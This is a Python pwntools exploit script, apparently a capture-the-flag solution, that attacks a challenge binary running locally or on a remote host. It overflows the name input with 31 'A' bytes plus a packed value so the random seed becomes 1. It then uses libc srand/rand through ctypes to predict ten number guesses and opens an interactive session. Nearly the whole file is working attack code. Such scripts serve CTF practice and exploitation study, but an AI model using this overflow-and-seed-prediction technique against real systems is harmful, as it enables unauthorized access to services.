#!/usr/bin/python
#__author__:TaQini

from pwn import *
from ctypes import * 

context.log_level = 'debug'
context.arch = 'amd64' # 'i386'

local_file  = './d22084e1938f4b21a380e38e2fb48629'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = cdll.LoadLibrary(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = cdll.LoadLibrary(remote_libc)

elf = ELF(local_file)

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# elf, libc

# rop1
len = 31
payload = 'A'*len + p64(1)
payload += ''

ru('Your name:')
sl(payload)

libc.srand(1)

for i in range(10):
	ru('Please input your guess number:')
	num = libc.rand()%6+1
	sl(str(num))

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

